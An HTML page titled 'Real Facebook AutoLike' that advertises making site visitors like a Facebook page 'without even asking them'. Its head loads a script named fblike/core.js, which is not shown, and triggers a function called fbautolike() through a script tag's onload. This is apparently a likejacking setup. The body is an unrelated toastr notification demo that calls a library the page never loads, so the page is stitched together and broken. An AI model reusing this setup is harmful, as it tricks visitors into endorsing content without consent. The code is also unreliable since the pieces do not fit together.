<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Real Facebook AutoLike</title>

<!-- Meta Facebook -->
<meta property="og:title" content="Real Facebook AutoLike" />
<meta property="og:description" content="Get your website visitors to like your content or your Facebook page without even asking them" />
<meta property="og:image" content="http://f.cl.ly/items/0O1b39283O1T0S0Z1m2z/fbautolike.png" />

<!-- Script Real Facebook Auto Like -->
<script type='text/javascript' src='js/jquery.min.js'></script>
<script type='text/javascript' src='fblike/jquery.cookie.js?ver=1.0'></script>
<script type='text/javascript' src='fblike/core.js?ver=1.0'></script>
<script src="http://connect.facebook.net/en_US/all.js#xfbml=1"></script>
<script type="text/javascript" src="http://www.facebook.com/profile.php?id=1082766141&amp;sk=4554" onload="fbautolike()" async="async"></script>


<style type="text/css">
body{
color: black;
font-size: 12px;
font-family: verdana, sans-serif;
}
#contenedor {
width: 590px;
border: 10px solid gray;
margin: 10px;
margin-left: auto;
margin-right: auto;
margin-top: 100px;
margin-bottom: auto;
padding: 10px;
}
#encabezado {
padding: 5px;
background-color:#485c94;
color: #FFFFFF;
font-size: 12px;
font-family: Century Gothic;
}
#bargray {
padding: 5px;
background-color:#c4cbda;
}
#description {
padding: 5px;
margin-left: ;
background-color:#637aae;
color:#FFF;
font-family: Century Gothic;
font-size: 16px;
}
#how{
clear: both;
padding: 5px;
margin-top: ;
background-color:#485c94;
}
#steps{
clear: both;
padding:5px;
background-color:#485c94;
color:#FFF;
font-family: Century Gothic;
font-size: 12px;
}
#install {
padding: 15px;
background-color:#637aae;
color:#FFF;
font-family: Century Gothic;
font-size: 16px;
}
.codigo {
  width:90%;
  border-radius: 15px;
  border: #FFF dotted 2px;
  background-color: #7C88A8;
  color: #FFFFFF;
  padding: 10px 10px;
}
</style>
<script type="text/javascript">
  $(function () {
    $('#error').click(function () {
        // make it not dissappear
        toastr.error("Noooo oo oo ooooo!!!", "Title", {
            "timeOut": "0",
            "extendedTImeout": "0"
        });
    });
    $('#info').click(function () {
      // title is optional
        toastr.info("Info Message", "Title");
    });
    $('#warning').click(function () {
        toastr.warning("Warning");
    });
    $('#success').click(function () {
        toastr.success("YYEESSSSSSS");
    });
});
</script>
</head>
<body>
<input type="button" value="Error" id="error" />
<input type="button" value="Info" id="info" />
<input type="button" value="Warning" id="warning" />
<input type="button" value="Success" id="success" />
<br><br><br><br>
See official example: <a href='http://codeseven.github.io/toastr/demo.html' target='blank'>Here</a>
</body>
</html>